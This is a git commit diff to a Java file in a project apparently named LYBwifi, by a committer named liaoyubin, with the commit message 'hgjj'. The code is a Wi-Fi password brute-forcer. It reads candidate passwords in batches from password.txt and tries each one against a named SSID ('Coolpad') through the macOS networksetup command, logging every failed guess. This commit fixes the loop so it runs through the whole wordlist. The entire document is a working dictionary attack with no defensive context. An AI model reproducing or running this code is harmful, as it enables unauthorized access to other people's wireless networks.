d4cba3fca6f2d0f2b0ae0645dcbd3f68da230cd0
liaoyubin <547941214@qq.com>
2019-06-28 10:23:51 +0800

    hgjj

--- LYBwifi/src/com/alialiso/wifi/MacApp.java
+++ LYBwifi/src/com/alialiso/wifi/MacApp.java
@@ -6,18 +6,19 @@ import java.util.List;
 
 public class MacApp {
     static String CONNECT = "networksetup -setairportnetwork en0 WIFI_NAME WIFI_PASSWORD";
-    static String wifiname = "apple";
+    static String wifiname = "Coolpad";
 
     public static void main(String[] args) {
         try {
 
             boolean next = true;
-            int pageSize = 1;
+            int pageSize = 0;
             while(next){
                 List<String> passwords = FileUtils.readLine(WindowsApp.APP_DIR+"/password.txt", pageSize * 1000, (pageSize + 1) * 1000 - 1);
                 pageSize++;
                 if (passwords != null && passwords.size() != 0){
                     for (String password : passwords) {
+//                        Thread.sleep(1000);
                         Long t1 = System.currentTimeMillis();
                         String cmd = MacApp.CONNECT.replace("WIFI_NAME",wifiname).replace("WIFI_PASSWORD",password);
                         List<String> execute = CMDUtil.execute(cmd, null);
@@ -31,9 +32,11 @@ public class MacApp {
                             System.out.println("连接失败，找不到wifi");
                             return;
                         }
+                        if (execute.toString().contains("Failed to join")){
+                            System.out.println("连接失败，密码错误:"+password);
+                        }
                         Long t2 = System.currentTimeMillis();
                         System.out.println("用时："+ (t2-t1));
-                        return;
                     }
                 }else{
                     next = false;
